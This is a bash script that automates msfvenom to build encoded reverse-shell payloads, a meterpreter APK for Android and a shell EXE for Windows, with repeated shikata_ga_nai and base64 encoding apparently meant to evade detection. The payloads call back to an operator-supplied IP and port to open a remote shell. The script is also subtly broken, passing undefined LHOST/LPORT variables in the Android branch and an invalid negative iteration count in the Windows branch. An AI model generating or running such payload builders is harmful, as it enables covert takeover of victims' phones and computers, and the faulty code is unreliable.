#!/bin/bash

echo -e "\033[1;5;4;34mDISCLAMAIRE\033[0m"

readd="\033[31m"
reset="\033[0m"

animation_chars="Please wait script is Checking requirements /-\|/-\|/-\|/-\|/-\|\-/|\-/|\-/|\-/|\-/|\-|\-/-\|/-\|/-\|\-/|"

for ((i=0; i<${#animation_chars}; i++)); do
	echo -ne "${readd}${animation_chars:i%${#animation_chars}:1}"
	echo -ne ${reset}
	sleep 0.1
done

echo

if command -v msfconsole && command -v msfvenom; then
	echo "Tools are already installed"
else
	echo "Tools are not installed in this system"
	echo "Please Download & install them manually"
	exit 1
fi

#echo   '*********   ********'
#echo '**********     *********'
sleep 3s  

echo "This script creates automatically payload using MSFVENOM"

sleep 1s

echo  "Kindly provide the OS you want use Payload in!"

sleep 1s

if [ $(whoami) = "root" ]; then
	echo "Good to go"
else
	echo -e "\033[31mPlease run this Script as SUPERUSER! \033[0m"
	exit 130
fi

echo "1 => Android"
echo "2 => Windows"
#echo "3 => Linux"

read os

if [ ${os} = "1" ]; then
	echo -n "What name you would like to give to the Android payload => "
	read name 
	sleep 0.3
	echo -n "Enter you local IP address => "
	read host
	sleep 0.3
	echo -n "Enter your Port number => "
	read port
	$(sudo msfvenom -p android/meterpreter/reverse_tcp --encoder x86/shikata_ga_nai -i 3 --arch dalvik --platform android --out .payload1.apk)
	$(sudo msfvenom -x .payload1.apk --encoder x86/shikata_ga_nai -i 3 --arch dalvik --platform android --out .payload2.apk)
	$(sudo msfvenom -x .payload2.apk --encoder ruby/base64 -i 3 --arch dalvik --platform android LHOST=${lhost} LPORT=${lport} --out ${name}.apk)
	$(rm -rf .payload1.apk .payload2.apk)
elif [ ${os} = "2" ]; then
	echo -n "What name you would like to give to the Windows payload => "
	read name 
	sleep 0.3
	echo -n "Enter you local IP address => "
	read host
	sleep 0.3
	echo -n "Enter your Port number => "
	read port
	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST=${host} LPORT=${port} -i -20 -f exe -o .windows.exe
	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST=${host} LPORT=${port} -i -20 -f exe -x .windows.exe  -o .windows1.exe
	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST=${host} LPORT=${port} -i -20 -f exe -x .windows1.exe -o .windows2.exe
	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST=${host} LPORT=${port} -i -20 -f exe -x .windows2.exe -o .windowsfinal.exe
#elif [ ${os} = "3" ]; then
	#echo -n "What name you would like to give to the Linux payload => "
	#read name 
	#sleep 0.3
	#echo -n "Enter you local IP address => "
	#read host
	#sleep 0.3
	#echo -n "Enter your Port number => "
	#read port
	#echo "holle"
	#echo "Your payload is completed"
	#echo "Please go to msfconsole to continue start your session"
	#echo "Good Day"
else
	echo "Error"
fi

